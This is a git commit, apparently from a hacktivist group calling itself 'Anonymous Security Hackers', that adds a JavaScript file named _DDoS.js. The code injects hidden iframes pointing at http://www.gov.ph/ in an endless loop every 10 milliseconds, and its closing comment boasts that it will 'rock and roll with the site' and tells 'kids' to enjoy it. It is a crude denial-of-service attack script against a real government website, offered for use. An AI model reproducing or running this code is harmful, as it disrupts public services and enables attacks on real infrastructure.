6257e34d7ccea7cafb201a675ac3d089803094ba
Anonymous Security Hackers <lulzsec780@gmail.com>
2016-10-13 16:03:01 +0800

    Create _DDoS.js

---
+++ src/_DDoS.js
@@ -0,0 +1,15 @@
+//Contributed by Sakura-chan
+//(c)Copyright 2016 - Anonymous Security Hackers
+
+function _DDoS(url){
+ document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
+}
+for(;;){
+ setTimeout('_DDoS("http://www.gov.ph/")',10);
+}
+
+/* This code will take a **
+** rock and roll with the**
+** site www.gov.ph       **
+** \m/ Enjoy this kids.  **
+*/
